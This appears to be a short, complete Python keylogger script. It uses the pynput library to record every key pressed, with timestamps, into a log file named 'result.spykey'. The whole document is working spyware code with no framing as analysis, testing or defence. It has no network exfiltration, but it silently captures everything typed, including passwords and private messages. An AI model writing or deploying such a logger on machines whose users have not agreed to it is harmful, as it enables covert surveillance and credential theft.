from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="result.spykey", level=logging.DEBUG, format="%(asctime)s : %(message)s")

def keystroke (key):
    
    logging.info("the {0} key has been pressed".format(key))
    

with Listener(on_press=keystroke) as input_keyboard:
    
    input_keyboard.join()
    
    
    